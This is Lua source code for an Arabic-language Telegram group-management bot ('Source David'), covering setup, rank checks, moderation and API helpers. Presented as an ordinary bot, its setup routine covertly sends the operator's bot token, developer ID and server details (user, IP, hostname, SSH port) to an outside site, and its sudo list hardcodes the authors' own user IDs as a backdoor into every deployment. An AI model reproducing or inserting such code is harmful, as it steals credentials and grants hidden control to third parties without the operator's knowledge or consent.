------------------------------------------------
-- This Source Was Developed By (Rio) @cicci.--
--   This Is The Source Channel @UUKXX .   --
--                - David -                 --
--        -- https://t.me/UUKXX --         --
------------------------------------------------ 
DevRio  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http") 
HTTPS   = require("ssl.https") 
https   = require("ssl.https") 
User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
--     Source David     --
local AutoSet = function() 
if not DevRio:get(Server.."IdDavid") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read()
if DevId ~= '' then
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevRio:set(Server.."IdDavid",DevId) 
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end
os.execute('lua David.lua') 
end
if not DevRio:get(Server.."TokenDavid") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
if res ~= 200 then 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevRio:set(Server.."TokenDavid",TokenBot) 
end  
else 
print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
end  
os.execute('lua David.lua') 
end
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
DevId = DevRio:get(Server.."IdDavid"),
TokenBot = DevRio:get(Server.."TokenDavid"),
David = DevRio:get(Server.."TokenDavid"):match("(%d+)"),
SudoIds = {DevRio:get(Server.."IdDavid")},
}
Create(Config, "./config.lua") 
https.request("https://alyafaevip.ml/LHB/index.php?Get=David&DevId="..DevRio:get(Server.."IdDavid").."&TokenBot="..DevRio:get(Server.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("David.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/David
token="]]..DevRio:get(Server.."TokenDavid")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "~ The tg File Was Not Found In The Bot Files!"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
if [ ! $token ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "~ The Token Was Not Found In The config.lua File!"
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
exit 1
fi
./tg -s ./David.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/David
while(true) do
rm -fr ../.telegram-cli
screen -S David -X kill
screen -S David ./David.sh
done
]]) 
file:close() 
io.popen("mkdir Files")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_David = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevRio:del(Server.."IdDavid");DevRio:del(Server.."TokenDavid")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_David() 
print("\27[36m"..[[          
' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '  ' 
'   ______       ____     __    __    _____   ______     '
'  (_  __ \     (    )    ) )  ( (   (_   _) (_  __ \    '
'    ) ) \ \    / /\ \   ( (    ) )    | |     ) ) \ \   '
'   ( (   ) )  ( (__) )   \ \  / /     | |    ( (   ) )  '
'    ) )  ) )   )    (     \ \/ /      | |     ) )  ) )  '
'   / /__/ /   /  /\  \     \  /      _| |__  / /__/ /   ' 
'  (______/   /__(  )__\     \/      /_____( (______/    '
'                                                        '
' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '  ' 
]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
Config = dofile("./config.lua")
DevId = Config.DevId
SudoIds = {Config.SudoIds,1321722045,1182543564,879123322}
David = Config.David
TokenBot = Config.TokenBot
NameBot = (DevRio:get(David..'Rio:NameBot') or 'مختل')
--     Source David     --
FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Source David     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source David     --
function dl_cb(arg, data)
end
--     Source David     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(DevId) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(DevId) then 
var = true 
end 
return var 
end
--     Source David     --
-------  RioSudo  -------
function RioSudo(msg) 
local Status = DevRio:sismember(David..'Rio:RioSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevRio:sismember(David..'Rio:SecondSudo:',msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(David) then  
var = true  
end  
return var  
end 
--     Source David     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevRio:sismember(David..'Rio:SudoBot:',msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
    --     Source David     --
----   RioConstructor   ----
function RioConstructor(msg) 
local Status = DevRio:sismember(David..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevRio:sismember(David..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
----    Constructor     ----
function Constructor(msg) 
local Status = DevRio:sismember(David..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or BasicConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
---------  Manager  --------
function Manager(msg) 
local Status = DevRio:sismember(David..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
----------  Admin  ---------
function Admin(msg) 
local Status = DevRio:sismember(David..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
---------Vip Member---------
function VipMem(msg) 
local Status = DevRio:sismember(David..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevRio:sismember(David..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
--------- CleanerNum ----------
function CleanerNum(msg) 
local Status = DevRio:sismember(David..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source David     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevRio:sismember(David..'Rio:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source David     --
---------  BanAll  ---------
function BanAll(user_id)
if DevRio:sismember(David..'Rio:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source David     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevRio:sismember(David..'Rio:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source David     --
---------  MuteAll  --------
function MuteAll(user_id)
if DevRio:sismember(David..'Rio:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source David     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source David     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source David     --
function DavidFiles(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.David and msg then
FilesText = plugin.David(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     Source David     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source David     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= David:lower() then 
send(chat,msg.id_,"✧| عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"✧| جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"✧| عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..David..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevRio:set(David.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevRio:sadd(David.."Rio:Groups",IdGps) 
DevRio:set(David.."Rio:Lock:Bots"..IdGps,"del") DevRio:hset(David.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevRio:set(David..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevRio:sadd(David..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevRio:sadd(David..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevRio:sadd(David..'Rio:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevRio:sadd(David..'Rio:Managers:'..IdGps,IdManagers)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevRio:sadd(David..'Rio:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevRio:sadd(David..'Rio:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevRio:set(David.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevRio:set(David.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
send(chat,msg.id_,"✧| تم رفع النسخه بنجاح \n✧| تم تفعيل جميع المجموعات \n✧| تم استرجاع مشرفين المجموعات \n✧| تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
end
--     Source David     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source David     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source David     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source David     --
function ChatLeave(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
end
--     Source David     --
function ChatKick(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
end
--     Source David     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source David     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source David     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source David     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     Source David     --
function Dev_Rio(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source David     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source David     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     Source David     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source David     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source David     --
function Pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source David     --
local RioRank = function(msg) if SudoId(msg.sender_user_id_) then DavidTeam  = "المطور" elseif RioSudo(msg) then DavidTeam = "المطور" elseif SecondSudo(msg) then DavidTeam = "المطور" elseif SudoBot(msg) then DavidTeam = "المطور" elseif Manager(msg) then DavidTeam = "المدير" elseif Admin(msg) then DavidTeam = "الادمن" else DavidTeam = "العضو" end return DavidTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1321722045) then DavidTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(879123322) then DavidTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1182543564) then DavidTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(David) then DavidTeam = 'البوت' elseif SudoId(user_id) then DavidTeam = 'المطور الاساسي' elseif DevRio:sismember(David..'Rio:RioSudo:', user_id) then DavidTeam = 'المطور الاساسي' elseif DevRio:sismember(David..'Rio:SecondSudo:', user_id) then DavidTeam = 'المطور الاساسي²' elseif DevRio:sismember(David..'Rio:SudoBot:', user_id) then DavidTeam = DevRio:get(David.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(David..'Rio:RioConstructor:'..chat_id, user_id) then DavidTeam = 'المالك' elseif DevRio:sismember(David..'Rio:BasicConstructor:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(David..'Rio:Constructor:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(David..'Rio:Managers:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(David..'Rio:Admins:'..chat_id, user_id) then DavidTeam = DevRio:get(David.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(David..'Rio:VipMem:'..chat_id, user_id) then  DavidTeam = DevRio:get(David.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(David..'Rio:Cleaner:'..chat_id, user_id) then  DavidTeam = DevRio:get(David.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else DavidTeam = DevRio:get(David.."Rio:mem:Rd"..chat_id) or 'العضو' end return DavidTeam end
--     Source David     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(David) then  
var = true
elseif DevRio:sismember(David..'Rio:RioSudo:', user_id) then
var = true
elseif DevRio:sismember(David..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevRio:sismember(David..'Rio:SudoBot:', user_id) then
var = true 
elseif DevRio:sismember(David..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(David..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(David..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(David..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(David..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(David..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function RioDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevRio:sismember(David..'Rio:RioSudo:', user_id) then
var = 'riosudo'
elseif DevRio:sismember(David..'Rio:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevRio:sismember(David..'Rio:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevRio:sismember(David..'Rio:RioConstructor:'..chat_id, user_id) then
var = 'RioConstructor'
elseif DevRio:sismember(David..'Rio:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevRio:sismember(David..'Rio:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevRio:sismember(David..'Rio:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     Source David     --
local function Filters(msg, value)
local rio = (David..'Rio:Filters:'..msg.chat_id_)
if rio then
local names = DevRio:hkeys(rio)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source David     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "UUKXX")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| عذرا عزيزي ↫ 」["..dp.first_name_.."](T.me/"..UserName..")".."」\n"..text, 1, 'md')
return false
end
if status == "Reply" then
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| العضو ↫「 ["..dp.first_name_.."](T.me/"..UserName..")".."」\n"..text, 1, 'md')
return false
end
if status == "ReplyBy" then
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| بواسطة ↫「["..dp.first_name_.."](T.me/"..UserName..")".."\n"..text, 1, 'md')
return false
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "✧| الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     Source David     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
Rio = GetInfo.result.custom_title
else 
Rio = Status
end
end
return Rio
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'✧| مالك المجموعه')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'✧| مجرد عضو هنا')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'✧| الشخص غير موجود هنا')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
send(msg.chat_id_,msg.id_,'✧| صلاحيات '..GetCustomTitle(user_id,msg.chat_id_)..' هي ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✧| حذف الرسائل ↫ '..DEL..'\n✧| دعوة المستخدمين ↫ '..INV..'\n✧| حظر المستخدمين ↫ '..BAN..'\n✧| تثبيت الرسائل ↫ '..PIN..'\n✧| تغيير المعلومات ↫ '..EDT..'\n✧| اضافة مشرفين ↫ '..VIP..'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉')
end
end
end
--     Source David     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
Rio = GetInfo.result.bio
else 
Rio = "لا يوجد"
end
end
return Rio
end
--     Source David     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
